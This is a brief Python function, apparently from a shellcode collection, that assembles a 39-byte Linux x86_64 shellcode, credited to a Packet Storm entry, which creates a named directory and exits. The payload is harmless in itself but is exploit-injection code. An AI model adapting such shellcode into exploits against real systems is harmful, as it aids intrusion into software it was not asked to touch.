#https://packetstormsecurity.com/files/127261/39-Bytes-mkdir-haxor-exit-Shellcode.html
#; Title: mkdir() 'haxor' and exit() Shellcode - 39 bytes
#; Platform: linux/x86_64
#; Date: 2014-06-26
#; Author: Osanda Malith Jayathissa (@OsandaMalith)



#WORK TESTED
#Linux whoami 3.19.0-37-generic #42~14.04.1-Ubuntu SMP Mon Nov 23 15:13:51 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
#Must be add chmod 777 ..
def mkdir( foldername):
	shellcode =  r"\xeb\x1b\x5e"
	shellcode += r"\x48\x31\xc0"
	shellcode += r"\xb0\x53\x48"
	shellcode += r"\x89\xf7\x66"
	shellcode += r"\xbe\xed\x01\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8"
	shellcode += r"\xe0\xff\xff\xff"
	shellcode += foldername
	return shellcode


